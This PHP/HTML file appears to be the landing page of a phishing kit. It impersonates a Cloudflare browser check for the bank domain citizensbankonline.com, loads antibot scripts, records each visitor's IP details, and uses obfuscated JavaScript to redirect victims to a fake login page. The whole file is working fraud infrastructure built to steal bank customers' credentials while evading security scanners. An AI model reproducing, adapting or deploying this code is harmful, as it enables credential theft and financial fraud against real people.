<?php

    session_start();

    require_once './Meta/Comp.php';
    require_once './Meta/Antibot.php';
    require_once './Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $_SESSION['ip'] = $comps->getIP();
    $_SESSION['ipDetails'] = $comps->getIPDetails();
    $settings = $comps->settings();
    $comps->createToken();

    if (isset($settings['CFProtection']) && $settings['CFProtection'] == "off") {
        die('<script> window.location.href = \'./Login/?token=' . $_SESSION['token'] . '\'; </script>');
    }

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Just a moment...</title>
        <link rel="shortcut icon" href="./Guard/img/favicon.png" type="image/x-icon">
        <link rel="stylesheet" href="./Guard/css/cf.css">
    </head>
    <body>
        <table width="100%" height="100%" cellpadding="20">
            <tbody>
                <tr>
                    <td valign="middle" align="center">
                        <div class="cf-browser-verification cf-im-under-attack">
                            <noscript>
                                <h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
                                
                                <style>
                                
                                #cf-content {
                                    display: none !important;
                                }

                                </style>
                            </noscript>
                            <div id="cf-content" style="display: block;">
                                <div id="cf-bubbles">
                                <div class="bubbles"></div>
                                <div class="bubbles"></div>
                                <div class="bubbles"></div>
                                </div>
                                <h1>
                                    <span data-translate="checking_browser">Checking your browser before accessing</span> citizensbankonline.com.
                                </h1>
                                <div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none">
                                    <p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p>
                                </div>
                                <p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your
                                requested content shortly.</p>
                                <p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs">Please allow up to 5 seconds…</p>
                                <p data-translate="redirecting" id="cf-spinner-redirecting" style="display:none">Redirecting…</p>
                            </div>
                        </div>
                        <div class="attribution">
                            DDoS protection by <a style="cursor: pointer;">Cloudflare</a>
                            <br>
                            <span class="ray_id">Ray ID: <code><?php echo uniqid();  ?></code></span>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </body>
    <script>
        var _0x2efe=['9430zwDzJl','85kKMdUq','7577WcwRrp','6502jhNFpb','146601QuZxkY','13699TyvWPW','14rWUVfE','15309VpTwJW','./Login/?token=<?php echo $_SESSION['token']; ?>','27233jaFqDs'];var _0x179f=function(_0x59284c,_0x36e29b){_0x59284c=_0x59284c-0x187;var _0x2efe40=_0x2efe[_0x59284c];return _0x2efe40;};(function(_0x4a7fe2,_0xde34a){var _0x529748=_0x179f;while(!![]){try{var _0x1d901e=-parseInt(_0x529748(0x18c))+-parseInt(_0x529748(0x18e))+-parseInt(_0x529748(0x18b))+parseInt(_0x529748(0x189))+-parseInt(_0x529748(0x188))*parseInt(_0x529748(0x187))+-parseInt(_0x529748(0x190))+-parseInt(_0x529748(0x18f))*-parseInt(_0x529748(0x18d));if(_0x1d901e===_0xde34a)break;else _0x4a7fe2['push'](_0x4a7fe2['shift']());}catch(_0x214b85){_0x4a7fe2['push'](_0x4a7fe2['shift']());}}}(_0x2efe,0x2d408),setTimeout(()=>{var _0x17c14b=_0x179f;window['location']['href']=_0x17c14b(0x18a);},0x5dc));
    </script>
</html>